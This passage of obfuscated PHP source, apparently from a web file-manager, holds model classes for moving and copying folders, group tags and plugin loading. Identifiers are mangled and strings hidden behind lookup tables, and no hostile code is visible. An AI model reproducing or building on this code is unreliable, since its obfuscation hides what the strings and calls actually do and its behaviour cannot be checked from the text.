($Ãú¼ñÕ && !$Şß’ó¸ñ[$”ˆŸ÷À¸[607]]) { $Şß’ó¸ñ[$”ˆŸ÷À¸[607]] = !0; } return $—ÅÔŠåı; } private function _moveForce($÷Ñ‚”«ú, $ ¤ƒ èĞ, $Ì–ß»ªá) { $§‡‘Â‹ô =& $_SERVER[ñ÷§¡å]; $å¤¼Ñ¸Ì = $this->sourceInfo($÷Ñ‚”«ú); $ ¼Ú”œÓ = $this->sourceInfo($ ¤ƒ èĞ); $ÑÉ¦ıË° = $å¤¼Ñ¸Ì[$§‡‘Â‹ô[419]] == $§‡‘Â‹ô[98]; $ıíĞ–• = array($§‡‘Â‹ô[410] => $ ¼Ú”œÓ[$§‡‘Â‹ô[411]], $§‡‘Â‹ô[599] => $ ¼Ú”œÓ[$§‡‘Â‹ô[530]] . $ ¼Ú”œÓ[$§‡‘Â‹ô[411]] . $§‡‘Â‹ô[50], $§‡‘Â‹ô[595] => $ ¼Ú”œÓ[$§‡‘Â‹ô[420]], $§‡‘Â‹ô[596] => $ ¼Ú”œÓ[$§‡‘Â‹ô[514]], $§‡‘Â‹ô[598] => USER_ID, $§‡‘Â‹ô[429] => $Ì–ß»ªá); $Ã×”¶¿ğ = $å¤¼Ñ¸Ì[$§‡‘Â‹ô[420]] == SourceModel::TYPE_GROUP && $ ¼Ú”œÓ[$§‡‘Â‹ô[420]] == SourceModel::TYPE_GROUP && $å¤¼Ñ¸Ì[$§‡‘Â‹ô[514]] == $ ¼Ú”œÓ[$§‡‘Â‹ô[514]]; if (!$Ã×”¶¿ğ && $this->moveClearAuth) { Model($§‡‘Â‹ô[511])->authClear($÷Ñ‚”«ú); } $ò£û™úú = $å¤¼Ñ¸Ì[$§‡‘Â‹ô[440]] == $§‡‘Â‹ô[98] && $ ¼Ú”œÓ[$§‡‘Â‹ô[440]] != $§‡‘Â‹ô[98]; if ($ò£û™úú) { $ıíĞ–•[$§‡‘Â‹ô[439]] = 0; } if ($ÑÉ¦ıË°) { $óçùšëö = array($§‡‘Â‹ô[599] => array($§‡‘Â‹ô[559], $å¤¼Ñ¸Ì[$§‡‘Â‹ô[530]] . $å¤¼Ñ¸Ì[$§‡‘Â‹ô[411]] . $§‡‘Â‹ô[560])); $¡ÇâõÛã = $å¤¼Ñ¸Ì[$§‡‘Â‹ô[530]] . $å¤¼Ñ¸Ì[$§‡‘Â‹ô[411]] . $§‡‘Â‹ô[50]; $§ş©ïŠş = $ ¼Ú”œÓ[$§‡‘Â‹ô[530]] . $ ¼Ú”œÓ[$§‡‘Â‹ô[411]] . $§‡‘Â‹ô[50] . $å¤¼Ñ¸Ì[$§‡‘Â‹ô[411]] . $§‡‘Â‹ô[50]; $Èç°¨Õ = array($§‡‘Â‹ô[599] => array($§‡‘Â‹ô[608], "\x72\145\x70\154\x61\143\145\x28\x70\141\x72\145\156\x74\x4c\x65\x76\x65\154\54\x27{$¡ÇâõÛã}\x27\x2c\x27{$§ş©ïŠş}\47\x29"), $§‡‘Â‹ô[595] => $ ¼Ú”œÓ[$§‡‘Â‹ô[420]], $§‡‘Â‹ô[596] => $ ¼Ú”œÓ[$§‡‘Â‹ô[514]]); if ($ò£û™úú) { $Èç°¨Õ[$§‡‘Â‹ô[439]] = 0; } $this->where($óçùšëö)->data($Èç°¨Õ)->save(); } $this->where(array($§‡‘Â‹ô[426] => $÷Ñ‚”«ú))->data($ıíĞ–•)->save(); return $÷Ñ‚”«ú; } private function clearShare($ñçëîÊÙ, $öÈÜ±©‹) { $«ºöÌŒ© =& $_SERVER[ñ÷§¡å]; $ëè‡À» = $this->sourceInfo($ñçëîÊÙ); $“ûÎ÷¡ = $this->sourceInfo($öÈÜ±©‹); if ($ëè‡À»[$«ºöÌŒ©[514]] == $“ûÎ÷¡[$«ºöÌŒ©[514]] && $ëè‡À»[$«ºöÌŒ©[420]] == $«ºöÌŒ©[609]) { return; } $œæ°›‘¶ = array($«ºöÌŒ©[530] => array($«ºöÌŒ©[559], $ëè‡À»[$«ºöÌŒ©[530]] . $ñçëîÊÙ . $«ºöÌŒ©[560])); $–·±©ë‡ = $this->field($«ºöÌŒ©[426])->where($œæ°›‘¶)->getField($«ºöÌŒ©[411], !0); if (!$–·±©ë‡) { return; } $œæ°›‘¶ = array($«ºöÌŒ©[411] => array($«ºöÌŒ©[7], $–·±©ë‡), $«ºöÌŒ©[505] => 1); $»Ä¨Ñ• = Model($«ºöÌŒ©[610])->field($«ºöÌŒ©[498])->where($œæ°›‘¶)->select(); if (!$»Ä¨Ñ•) { return; } $»Ä¨Ñ• = array_to_keyvalue($»Ä¨Ñ•, $«ºöÌŒ©[12], $«ºöÌŒ©[498]); $œæ°›‘¶ = array($«ºöÌŒ©[498] => array($«ºöÌŒ©[7], $»Ä¨Ñ•)); Model($«ºöÌŒ©[610])->where($œæ°›‘¶)->save(array($«ºöÌŒ©[505] => 0)); Model($«ºöÌŒ©[611])->where($œæ°›‘¶)->delete(); } public function copyFolderFromIO($æÈ‚–ç, $‚øï·£, $ˆ³š­™, $õÓ‹üéá, $ÕŒç¹Ó„, $²‚·ñÙš = false) { $»ıß˜Ÿ‘ =& $_SERVER[ñ÷§¡å]; $Ö¦¾ü’± = array($»ıß˜Ÿ‘[576] => array(), $»ıß˜Ÿ‘[577] => array(), $»ıß˜Ÿ‘[575] => array(), $»ıß˜Ÿ‘[612] => array()); $ï°º†ıï = $²‚·ñÙš ? $²‚·ñÙš : $æÈ‚–ç->pathThis($‚øï·£); $·Ú¢‰í™ = $this->fileNameExist($ˆ³š­™, $ï°º†ıï); $äÃàöˆú = $this->mkdir($ˆ³š­™, $ï°º†ıï, $õÓ‹üéá); if (!$·Ú¢‰í™ || $õÓ‹üéá == REPEAT_RENAME_FOLDER) { $õÓ‹üéá = !1; } if ($·Ú¢‰í™) { $this->_childrenAllMake($·Ú¢‰í™); } Hook::trigger($»ıß˜Ÿ‘[613]); $this->_copyChildTo($æÈ‚–ç, $‚øï·£, $äÃàöˆú, $õÓ‹üéá, $Ö¦¾ü’±, $ÕŒç¹Ó„); Hook::trigger($»ıß˜Ÿ‘[614]); if ($äÃàöˆú) { $this->folderSizeResetChildren($äÃàöˆú); } $this->_childrenListClear(); Model($»ıß˜Ÿ‘[578])->addAll($Ö¦¾ü’±[$»ıß˜Ÿ‘[576]], array(), !0); Model($»ıß˜Ÿ‘[579])->eventCopy($äÃàöˆú); $this->saveAll($Ö¦¾ü’±[$»ıß˜Ÿ‘[577]]); Model($»ıß˜Ÿ‘[480])->linkAdd($Ö¦¾ü’±[$»ıß˜Ÿ‘[575]]); Model($»ıß˜Ÿ‘[480])->remove($Ö¦¾ü’±[$»ıß˜Ÿ‘[612]]); $this->folderSizeReset($ˆ³š­™); $this->updateModifyTime($ˆ³š­™); return $äÃàöˆú; } private function _copyChildTo($¿ªÓÀÌ“, $Ú†š…±, $„ÛÕ½Ú–, $–´û²˜Ï, &$ÀÑµ†Úó, $¥§’¥®) { $›”Øôûø =& $_SERVER[ñ÷§¡å]; $ËşÖìÛà = $this->sourceInfoCache($„ÛÕ½Ú–); $ªÑĞ÷Áä = $¿ªÓÀÌ“->listPath($Ú†š…±); $ªÑĞ÷Áä = $ªÑĞ÷Áä ? $ªÑĞ÷Áä : array($›”Øôûø[93] => array(), $›”Øôûø[92] => array()); $ÏÈöÓ©„ = array_merge($ªÑĞ÷Áä[$›”Øôûø[93]], $ªÑĞ÷Áä[$›”Øôûø[92]]); $É‚£ÃÁá = $this->_addFiles($¿ªÓÀÌ“, $ªÑĞ÷Áä[$›”Øôûø[93]], $¥§’¥®); $î©ù„Û§ = array(); foreach ($ÏÈöÓ©„ as &$Ã¢±‹Å) { if (isset($É‚£ÃÁá[$Ã¢±‹Å[$›”Øôûø[32]]])) { $Ã¢±‹Å = $É‚£ÃÁá[$Ã¢±‹Å[$›”Øôûø[32]]]; } $Ã¢±‹Å[$›”Øôûø[419]] = $Ã¢±‹Å[$›”Øôûø[33]] == $›”Øôûø[85]; $Ã¢±‹Å[$›”Øôûø[421]] = substr(_get($Ã¢±‹Å, $›”Øôûø[184], $›”Øôûø[12]), 0, 10); $Ã¢±‹Å[$›”Øôûø[86]] = _get($Ã¢±‹Å, $›”Øôûø[86], 0); $Ã¢±‹Å[$›”Øôûø[477]] = _get($Ã¢±‹Å, $›”Øôûø[477], 0); if (!isset($Ã¢±‹Å[$›”Øôûø[615]]) && $Ã¢±‹Å[$›”Øôûø[477]]) { $ÀÑµ†Úó[$›”Øôûø[612]][] = $Ã¢±‹Å[$›”Øôûø[477]]; } if ($–´û²˜Ï) { $ñÙ‘ßüí = $this->fileNameExistCache($„ÛÕ½Ú–, $Ã¢±‹Å[$›”Øôûø[32]]); if ($ñÙ‘ßüí) { if ($Ã¢±‹Å[$›”Øôûø[419]] || $–´û²˜Ï == REPEAT_SKIP) { continue; } if ($–´û²˜Ï == REPEAT_REPLACE) { $„šÅÂ¡æ = $this->sourceInfoCache($ñÙ‘ßüí); $×ÇÕÉ‡ = $this->fileHistory($„šÅÂ¡æ, $Ã¢±‹Å[$›”Øôûø[477]], $Ã¢±‹Å[$›”Øôûø[86]]); if ($×ÇÕÉ‡) { $ÀÑµ†Úó[$›”Øôûø[575]][] = $Ã¢±‹Å[$›”Øôûø[477]]; } continue; } else { if ($–´û²˜Ï == REPEAT_RENAME) { $Ã¢±‹Å[$›”Øôûø[32]] = $this->fileNameAutoCache($„ÛÕ½Ú–, $Ã¢±‹Å[$›”Øôûø[32]], $–´û²˜Ï, !1); } } } } if (!$Ã¢±‹Å[$›”Øôûø[419]] && $Ã¢±‹Å[$›”Øôûø[477]] == 0) { continue; } if (!$Ã¢±‹Å[$›”Øôûø[419]] && $Ã¢±‹Å[$›”Øôûø[477]]) { $ÀÑµ†Úó[$›”Øôûø[575]][] = $Ã¢±‹Å[$›”Øôûø[477]]; } $î©ù„Û§[] = $this->_makeItemData($Ã¢±‹Å, $ËşÖìÛà, $Ã¢±‹Å[$›”Øôûø[32]]); } unset($Ã¢±‹Å); if (!empty($î©ù„Û§)) { $this->addAll($î©ù„Û§); $this->_childrenListSelect($„ÛÕ½Ú–); } $Ş­íÎ„Ê = $this->_childrenList($„ÛÕ½Ú–); $Ş­íÎ„Ê = array_to_keyvalue($Ş­íÎ„Ê, $›”Øôûø[32]); foreach ($ÏÈöÓ©„ as $Ã¢±‹Å) { $„šÅÂ¡æ = $Ş­íÎ„Ê[$Ã¢±‹Å[$›”Øôûø[32]]]; $ş‘ŞŒ‘ = $„šÅÂ¡æ[$›”Øôûø[411]]; $this->_copyApplyMeta($„šÅÂ¡æ, $ÀÑµ†Úó); if ($Ã¢±‹Å[$›”Øôûø[33]] == $›”Øôûø[85]) { $Ã¢±‹Å[$›”Øôûø[94]] = $¿ªÓÀÌ“->getPathInner($Ã¢±‹Å[$›”Øôûø[94]]); $this->_copyChildTo($¿ªÓÀÌ“, $Ã¢±‹Å[$›”Øôûø[94]], $ş‘ŞŒ‘, $–´û²˜Ï, $ÀÑµ†Úó, $¥§’¥®); } } } private function _addFiles($ëöÖ–¢, $­ûÖ…š, $ƒ¬˜¡Ëœ) { $—ÈçÈ”  =& $_SERVER[ñ÷§¡å]; if (!$­ûÖ…š || count($­ûÖ…š) == 0) { return array(); } $¦Æ§Ó®‘ = array(); foreach ($­ûÖ…š as &$ßº€ÔóÉ) { Hook::trigger($—ÈçÈ” [616], $ßº€ÔóÉ); $ßº€ÔóÉ[$—ÈçÈ” [94]] = $ëöÖ–¢->getPathInner($ßº€ÔóÉ[$—ÈçÈ” [94]]); $äğ•£ = $ëöÖ–¢->hashSimple($ßº€ÔóÉ[$—ÈçÈ” [94]]); $“Ô­×áÇ = $ëöÖ–¢->hashMd5($ßº€ÔóÉ[$—ÈçÈ” [94]]); if (strlen($“Ô­×áÇ) > 10 && !isset($¦Æ§Ó®‘[$“Ô­×áÇ])) { $¦Æ§Ó®‘[$“Ô­×áÇ] = array(); } $ßº€ÔóÉ[$—ÈçÈ” [187]] = $äğ•£; $ßº€ÔóÉ[$—ÈçÈ” [186]] = $“Ô­×áÇ; $¦Æ§Ó®‘[$“Ô­×áÇ][] =& $ßº€ÔóÉ; if (count($¦Æ§Ó®‘[$“Ô­×áÇ]) > 1) { $ßº€ÔóÉ[$—ÈçÈ” [615]] = !0; } Hook::trigger($—ÈçÈ” [617], $ßº€ÔóÉ); } unset($ßº€ÔóÉ); $ôÎ¡Åğ™ = array($—ÈçÈ” [186] => array($—ÈçÈ” [7], array_keys($¦Æ§Ó®‘))); $é¥¡ƒşµ = Model($—ÈçÈ” [618]); $¦²«ó¤ = $é¥¡ƒşµ->where($ôÎ¡Åğ™)->select(); $¦²«ó¤ = $¦²«ó¤ ? $¦²«ó¤ : array(); foreach ($¦²«ó¤ as $¨Àâ€‹‡) { if (!isset($¦Æ§Ó®‘[$¨Àâ€‹‡[$—ÈçÈ” [186]]])) { continue; } $ˆš˜îºÁ = $¦Æ§Ó®‘[$¨Àâ€‹‡[$—ÈçÈ” [186]]]; foreach ($ˆš˜îºÁ as &$ßº€ÔóÉ) { $ßº€ÔóÉ[$—ÈçÈ” [477]] = $¨Àâ€‹‡[$—ÈçÈ” [477]]; $ßº€ÔóÉ[$—ÈçÈ” [615]] = !0; } unset($ßº€ÔóÉ); } $šİœ¾æ  = array(); foreach ($­ûÖ…š as $Ù„ñÕèî) { Hook::trigger($—ÈçÈ” [619], $Ù„ñÕèî); if (isset($Ù„ñÕèî[$—ÈçÈ” [615]]) && $Ù„ñÕèî[$—ÈçÈ” [615]]) { Hook::trigger($—ÈçÈ” [620], $Ù„ñÕèî); continue; } $€œĞ£Şá = $ëöÖ–¢->getPathInner($Ù„ñÕèî[$—ÈçÈ” [94]]); $×ìˆöâ = $é¥¡ƒşµ->addFileMake($€œĞ£Şá, $Ù„ñÕèî[$—ÈçÈ” [86]], $Ù„ñÕèî[$—ÈçÈ” [187]], $Ù„ñÕèî[$—ÈçÈ” [186]], $Ù„ñÕèî[$—ÈçÈ” [32]], $ƒ¬˜¡Ëœ); Hook::trigger($—ÈçÈ” [620], $Ù„ñÕèî); if (!is_array($×ìˆöâ)) { continue; } $šİœ¾æ [] = $×ìˆöâ; } $é¥¡ƒşµ->addAll($šİœ¾æ ); $ôÎ¡Åğ™ = array($—ÈçÈ” [186] => array($—ÈçÈ” [7], array_keys($¦Æ§Ó®‘))); $¦²«ó¤ = $é¥¡ƒşµ->where($ôÎ¡Åğ™)->select(); $¦²«ó¤ = $¦²«ó¤ ? $¦²«ó¤ : array(); foreach ($¦²«ó¤ as $¨Àâ€‹‡) { if (!isset($¦Æ§Ó®‘[$¨Àâ€‹‡[$—ÈçÈ” [186]]])) { continue; } $ö±Í  =& $¦Æ§Ó®‘[$¨Àâ€‹‡[$—ÈçÈ” [186]]]; foreach ($ö±Í  as &$ßº€ÔóÉ) { $ßº€ÔóÉ[$—ÈçÈ” [477]] = $¨Àâ€‹‡[$—ÈçÈ” [477]]; } unset($ßº€ÔóÉ); } $ãÖ½¬º† = array(); foreach ($­ûÖ…š as $»ı¢ï¯Ì) { $ãÖ½¬º†[$»ı¢ï¯Ì[$—ÈçÈ” [32]]] = $»ı¢ï¯Ì; } return $ãÖ½¬º†; } } define($_SERVER[ñ÷§¡å][621], $_SERVER[ñ÷§¡å][622]); goto c­±Öºø¤„; f¤Ìõóê‡: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($é‰ØĞĞ) { $‹ñÇœàø =& $_SERVER[ñ÷§¡å]; return array($‹ñÇœàø[1944] => array($é‰ØĞĞ[0], $‹ñÇœàø[1945]), $‹ñÇœàø[1946] => array($é‰ØĞĞ[0], $‹ñÇœàø[1947])); } protected function get($±å’©¦) { $æ°ğ¢À =& $_SERVER[ñ÷§¡å]; $µıŠê„Á = Model($æ°ğ¢À[531])->metaGet($±å’©¦, $æ°ğ¢À[1948]); $õÀÜÈ‹¥ = json_decode($µıŠê„Á, !0); return $õÀÜÈ‹¥ ? $õÀÜÈ‹¥ : array($æ°ğ¢À[1949] => $æ°ğ¢À[98], $æ°ğ¢À[378] => array()); } protected function set($ÌÚ­Äª, $ÜºÒøÈà) { $¡Ïßşæ =& $_SERVER[ñ÷§¡å]; $ÜºÒøÈà = $ÜºÒøÈà ? $ÜºÒøÈà : array($¡Ïßşæ[1949] => $¡Ïßşæ[98], $¡Ïßşæ[378] => array()); return Model($¡Ïßşæ[531])->metaSet($ÌÚ­Äª, $¡Ïßşæ[1948], json_encode($ÜºÒøÈà)); } protected function getByTagID($ÆØ¨ïµö, $şÆõø«Ê) { $“°¤£Š =& $_SERVER[ñ÷§¡å]; if (!$ÆØ¨ïµö || !$şÆõø«Ê) { return !1; } if (!Model($“°¤£Š[531])->getInfoSimple($ÆØ¨ïµö)) { return !1; } $ªÏˆÜ´ = $this->get($ÆØ¨ïµö); if (!$ªÏˆÜ´ || !isset($ªÏˆÜ´[$“°¤£Š[378]])) { return !1; } $ï±…œÆó = array_find_by_field($ªÏˆÜ´[$“°¤£Š[378]], $“°¤£Š[408], $şÆõø«Ê); return is_array($ï±…œÆó) ? $ï±…œÆó : !1; } public function listSource($äëÑÏ¼ü, $ø¯ç®¡†) { $ü„©Õ–î =& $_SERVER[ñ÷§¡å]; if ($ø¯ç®¡† && !is_array($ø¯ç®¡†)) { $ø¯ç®¡† = array($ø¯ç®¡†); } $©ëÆœˆ” = $this->listData($äëÑÏ¼ü); $Å‘÷Ÿñğ = array(); foreach ($©ëÆœˆ” as $îªøçàÁ) { $°ğùù = $îªøçàÁ[$ü„©Õ–î[94]]; if (!$°ğùù) { continue; } if (!isset($Å‘÷Ÿñğ[$°ğùù])) { $Å‘÷Ÿñğ[$°ğùù] = array(); } $Å‘÷Ÿñğ[$°ğùù][] = $îªøçàÁ[$ü„©Õ–î[435]]; } $–åà¡ğÆ = array(); foreach ($Å‘÷Ÿñğ as $òœ®Ö»Ä => $Îü²”—±) { $²ëŒÖ æ = !0; if (!$ø¯ç®¡†) { $–åà¡ğÆ[] = $òœ®Ö»Ä; continue; } foreach ($ø¯ç®¡† as $Ü…©Œºµ) { if (!in_array($Ü…©Œºµ, $Îü²”—±)) { $²ëŒÖ æ = !1; break; } } if ($²ëŒÖ æ) { $–åà¡ğÆ[] = $òœ®Ö»Ä; } } if (!$–åà¡ğÆ) { return array(); } $íÚ’ì‰ = array($ü„©Õ–î[426] => array($ü„©Õ–î[427], $–åà¡ğÆ), $ü„©Õ–î[514] => $äëÑÏ¼ü, $ü„©Õ–î[420] => SourceModel::TYPE_GROUP); $ÃÆ‡È¯Ø = Model($ü„©Õ–î[1334])->listSource($íÚ’ì‰); if (!$ÃÆ‡È¯Ø || count($–åà¡ğÆ) == $ÃÆ‡È¯Ø[$ü„©Õ–î[375]][$ü„©Õ–î[376]]) { return $ÃÆ‡È¯Ø; } $İ·ÄëÕÜ = array(); $¡¤èè¡ = array_to_keyvalue($ÃÆ‡È¯Ø[$ü„©Õ–î[92]], $ü„©Õ–î[12], $ü„©Õ–î[411]); $É‰€çşà = array_to_keyvalue($ÃÆ‡È¯Ø[$ü„©Õ–î[93]], $ü„©Õ–î[12], $ü„©Õ–î[411]); $óÄ²ğß = array_merge($É‰€çşà, $¡¤èè¡); foreach ($–åà¡ğÆ as $°ğùù) { if (!in_array($°ğùù, $óÄ²ğß)) { $İ·ÄëÕÜ[] = $°ğùù; } } if ($İ·ÄëÕÜ) { $this->removeBySource($äëÑÏ¼ü, $İ·ÄëÕÜ); } return $ÃÆ‡È¯Ø; } protected function listData($Ÿî¬Ş²) { $¯—¬¤•€ =& $_SERVER[ñ÷§¡å]; $×…ü‘®Ä = array($¯—¬¤•€[1654] => 0, $¯—¬¤•€[493] => array($¯—¬¤•€[1950], 0), $¯—¬¤•€[431] => $¯—¬¤•€[1951] . $Ÿî¬Ş²); $¯¤Ãş† = $¯—¬¤•€[1952]; $á¦°¿ğ» = $this->field($¯¤Ãş†)->where($×…ü‘®Ä)->order($¯—¬¤•€[1953])->select(); return $á¦°¿ğ» ? $á¦°¿ğ» : array(); } protected function addToTag($İ¹Ò¹öˆ, $ìîåçÓµ, $àï‰†å) { $ÇÁ”İŸå =& $_SERVER[ñ÷§¡å]; if (!$this->getByTagID($İ¹Ò¹öˆ, $àï‰†å) || !$ìîåçÓµ) { return !1; } if (!Model($ÇÁ”İŸå[838])->pathInfo($ìîåçÓµ)) { return !1; } $Óà°Ì¡Ç = array($ÇÁ”İŸå[1654] => 0, $ÇÁ”İŸå[493] => $àï‰†å, $ÇÁ”İŸå[430] => $ìîåçÓµ, $ÇÁ”İŸå[431] => $ÇÁ”İŸå[1954] . $İ¹Ò¹öˆ, $ÇÁ”İŸå[429] => $ÇÁ”İŸå[12], $ÇÁ”İŸå[1839] => 0); if ($this->where($Óà°Ì¡Ç)->find()) { return !1; } return $this->add($Óà°Ì¡Ç); } protected function removeFromTag($òêİ­è, $¨Â¶¥û, $›–ÛçŞÛ) { $È¢¾¡’ =& $_SERVER[ñ÷§¡å]; if (!$this->getByTagID($òêİ­è, $›–ÛçŞÛ) || !$¨Â¶¥û) { return !1; } if (is_array($¨Â¶¥û)) { $¨Â¶¥û = array($È¢¾¡’[7], $¨Â¶¥û); } $¼ÕÁ¯Ëª = array($È¢¾¡’[1654] => 0, $È¢¾¡’[493] => $›–ÛçŞÛ, $È¢¾¡’[431] => $È¢¾¡’[1954] . $òêİ­è, $È¢¾¡’[430] => $¨Â¶¥û); return $this->where($¼ÕÁ¯Ëª)->delete(); } protected function removeByTag($‡·ÙÖ•, $¦îìéİ©) { $¶È»ÓÈ =& $_SERVER[ñ÷§¡å]; if (!$this->getByTagID($‡·ÙÖ•, $¦îìéİ©)) { return !1; } $›Æµ—™ï = array($¶È»ÓÈ[1654] => 0, $¶È»ÓÈ[493] => $¦îìéİ©, $¶È»ÓÈ[431] => $¶È»ÓÈ[1954] . $‡·ÙÖ•); return $this->where($›Æµ—™ï)->delete(); } protected function removeBySource($ÛÖê•éÆ, $Â –™ƒ¸) { $ğ¡îÜ¤ =& $_SERVER[ñ÷§¡å]; if (!$ÛÖê•éÆ || !$Â –™ƒ¸) { return !1; } if (is_array($Â –™ƒ¸)) { $Â –™ƒ¸ = array($ğ¡îÜ¤[7], $Â –™ƒ¸); } $öÃÊ•¡ = array($ğ¡îÜ¤[1654] => 0, $ğ¡îÜ¤[430] => $Â –™ƒ¸, $ğ¡îÜ¤[493] => array($ğ¡îÜ¤[1021], 0), $ğ¡îÜ¤[431] => $ğ¡îÜ¤[1954] . $ÛÖê•éÆ); return $this->where($öÃÊ•¡)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\x70\154\x75\147\151\x6e\114\x69\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\163\x74\x61\164\165\163", "\162\145\147\151\145\x73\164", "\x63\157\x6e\146\x69\147"); public function loadList($ËÆ€¯Ğ = false) { $’¶ªíûğ = array_to_keyvalue($this->listData(), $_SERVER[ñ÷§¡å][32]); if ($ËÆ€¯Ğ) { return $’¶ªíûğ[$ËÆ€¯Ğ]; } return $’¶ªíûğ; } public function init() { $˜Üê’Ò =& $_SERVER[ñ÷§¡å]; Hook::trigger($˜Üê’Ò[1955]); $Å•¤†É´ = $this->loadPluginList(); foreach ($Å•¤†É´ as $Åòä¹Ÿû => $·¥·¶¢) { $¡ÇÆ“µÖ = $this->appAllow($Åòä¹Ÿû, $·¥·¶¢); if (!$¡ÇÆ“µÖ) { continue; } foreach ($·¥·¶¢[$˜Üê’Ò[1956]] as $í¾¿ûœÄ => $‘çèŞ¦À) { Hook::bind($í¾¿ûœÄ, $‘çèŞ¦À); } } Hook::trigger($˜Üê’Ò[1957]); Hook::trigger(ACTION); } public function appAllow($ä‡à“ùÇ, $Ôº¹şëÏ, $»£ôüœ± = true) { $â¯î­Å€ =& $_SERVER[ñ÷§¡å]; $Ç¾™–˜ï = PLUGIN_DIR . $ä‡à“ùÇ . $â¯î­Å€[1958]; if (!is_array($Ôº¹şëÏ) || !is_array($Ôº¹şëÏ[$â¯î­Å€[1956]]) || $Ôº¹şëÏ[$â¯î­Å€[763]] != 1 || !is_file($Ç¾™–˜ï)) { return !1; } if ($GLOBALS[$â¯î­Å€[512]] == 1) { if ($GLOBALS[$â¯î­Å€[6]][$â¯î­Å€[1959]] || !$GLOBALS[$â¯î­Å€[6]][$â¯î­Å€[1960]]) { return !0; } $ÊöòıĞÉ = explode($â¯î­Å€[50], strtolower($GLOBALS[$â¯î­Å€[6]][$â¯î­Å€[1960]])); return in_array(strtolower($ä‡à“ùÇ), $ÊöòıĞÉ) ? !1 : !0; } if ($»£ôüœ± && !Action($â¯î­Å€[1961])->checkAuth($ä‡à“ùÇ)) { return !1; } return !0; } public function unInstall($ò½ìò±¢) { $¨İòŠéª =& $_SERVER[ñ÷§¡å]; $›Ë«€ú¥ = $this->loadList($ò½ìò±¢); if (file_exists(PLUGIN_DIR . $ò½ìò±¢)) { Hook::apply($ò½ìò±¢ . $¨İòŠéª[1962]); } $this->remove($›Ë«€ú¥[$¨İòŠéª[408]]); } public function changeStatus($ñ°íâ¸ª, $²õƒ©­) { $üºüŞöË =& $_SERVER[ñ÷§¡å]; $Üú©º¯ = $this->loadList($ñ°íâ¸ª); if ($²õƒ©­) { Hook::apply($ñ°íâ¸ª . $üºüŞöË[1963]); } $this->update($Üú©º¯[$üºüŞöË[408]], array($üºüŞöË[1964] => $²õƒ©­)); } public function appRegist($¬ŒÉŞ‡Ñ, $‹Âë) { $öÂÈì”” =& $_SERVER[ñ÷§¡å]; $ì¥Üö®Ö = $this->loadList($¬ŒÉŞ‡Ñ); if ($ì¥Üö®Ö) { $this->update($ì¥Üö®Ö[$öÂÈì””[408]], array($öÂÈì””[1956] => $‹Âë)); } else { $šá…ã°° = array($öÂÈì””[32] => $¬ŒÉŞ‡Ñ, $öÂÈì””[1956] => $‹Âë, $öÂÈì””[763] => 0, $öÂÈì””[6] => $this->getConfigDefault($¬ŒÉŞ‡Ñ)); $this->insert($šá…ã°°); } } public function getConfigDefault($Á´ûôÆ›) { $’×éĞò» =& $_SERVER[ñ÷§¡å]; $òáÇ‹ê” = array(); $ÕıèÇ×ˆ = $this->getPackageJson($Á´ûôÆ›); if (!$ÕıèÇ×ˆ && is_array($ÕıèÇ×ˆ[$’×éĞò»[1965]])) { return $òáÇ‹ê”; } foreach ($ÕıèÇ×ˆ[$’×éĞò»[1965]] as $ù÷á×´ => $èÖ²şÀÅ) { if (!isset($èÖ²şÀÅ[$’×éĞò»[383]]) || isset($òáÇ‹ê”[$ù÷á×´])) { continue; } $òáÇ‹ê”[$ù÷á×´] = $èÖ²şÀÅ[$’×éĞò»[383]]; } return $òáÇ‹ê”; } public function getPackageJson($Ù°¢Î) { return Hook::apply($Ù°¢Î . $_SERVER[ñ÷§¡å][1966]); } public function getConfig($çİÜÊÄ±, $¤€Šù‰ñ = false) { $Äè¢öÁ· =& $_SERVER[ñ÷§¡å]; $æĞÌ¦â = array(); $Ğ³’éå = $this->loadList($çİÜÊÄ±); if ($Ğ³’éå && is_array($Ğ³’éå[$Äè¢öÁ·[6]])) { $æĞÌ¦â = $Ğ³’éå[$Äè¢öÁ·[6]]; } if (!$æĞÌ¦â || $¤€Šù‰ñ) { $æĞÌ¦â = $this->getConfigDefault($çİÜÊÄ±); } return $æĞÌ¦â; } public function setConfig($ı³Û€ª¦, $Ã¿Ë‡Ö = false) { $³³Ê˜­ =& $_SERVER[ñ÷§¡å]; $ÜÍ÷¥şä = $this->loadList($ı³Û€ª¦); if (!$ÜÍ÷¥şä) { return !1; } $¬„Úª€¦ = $ÜÍ÷¥şä[$³³Ê˜­[6]]; if ($Ã¿Ë‡Ö == !1) { $¬„Úª€¦ = array(); $Ã¿Ë‡Ö = $this->getConfigDefault($ı³Û€ª¦); } foreach ($Ã¿Ë‡Ö as $½ş¡òƒè => $ûµ†´Ş‚) { $¬„Úª€¦[$½ş¡òƒè] = is_string($ûµ†´Ş‚) ? trim($ûµ†´Ş‚) : $ûµ†´Ş‚; } $this->update($ÜÍ÷¥şä[$³³Ê˜­[408]], array($³³Ê˜­[6] => $¬„Úª€¦)); } public function viewList() { $¯Ê«úğ =& $_SERVER[ñ÷§¡å]; $¼æ¾Ğ¡Ñ = $this->loadList(); $this->pluginScan($¼æ¾Ğ¡Ñ); $¼æ¾Ğ¡Ñ = $this->loadPluginList(); $’ÕçÆñú = array(); foreach ($¼æ¾Ğ¡Ñ as $Ìä¾Ó¾« => $÷Ò»¼ªå) { unset($÷Ò»¼ªå[$¯Ê«úğ[1956]], $÷Ò»¼ªå[$¯Ê«úğ[6]]); $Èßı»Ó = PLUGIN_DIR . $÷Ò»¼ªå[$¯Ê«úğ[32]] . $¯Ê«úğ[1958]; if (!is_file($Èßı»Ó)) { continue; } $ú‰ôœò = Hook::apply($÷Ò»¼ªå[$¯Ê«úğ[32]] . $¯Ê«úğ[1966]); if (is_array($ú‰ôœò)) { $’ÕçÆñú[$Ìä¾Ó¾«] = array_merge($÷Ò»¼ªå, $ú‰ôœò); } } return $’ÕçÆñú; } private function loadPluginList() { $ÛÙùÔÕ =& $_SERVER[ñ÷§¡å]; $æÙ¡Ç§ = $this->loadList(); if (strtolower(MOD) == $ÛÙùÔÕ[1967]) { return $æÙ¡Ç§; } $·¼ÌÉùŸ = Hook::trigger($ÛÙùÔÕ[1968], $æÙ¡Ç§); if ($æÙ¡Ç§ && !$·¼ÌÉùŸ) { die; } return $·¼ÌÉùŸ ? $·¼ÌÉùŸ : $æÙ¡Ç§; } private function pluginScan($´â«êÖ¬) { $¥Çü‚Æï =& 